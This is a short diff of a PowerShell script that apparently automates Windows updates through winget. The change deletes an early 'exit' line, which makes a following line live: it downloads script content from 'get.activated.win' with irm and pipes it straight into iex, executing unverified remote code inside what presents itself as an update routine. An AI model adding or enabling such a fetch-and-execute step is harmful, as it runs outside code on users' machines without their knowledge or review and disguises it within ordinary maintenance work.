@@ -34,6 +34,5 @@ if($p.ExitCode -eq 0){Write-Host "[ok] final upgrade"}else{Write-Host "[info] fi
 Stop-Transcript|Out-Null
 Start-Sleep 2
 Start-Process powershell -ArgumentList "-NoExit -Command winget upgrade --all --silent --include-unknown --accept-package-agreements --disable-interactivity --nowarn"
-exit
 Start-Process powershell -ArgumentList "-NoExit -Command `"irm https://get.activated.win | iex | iex`""
 exit
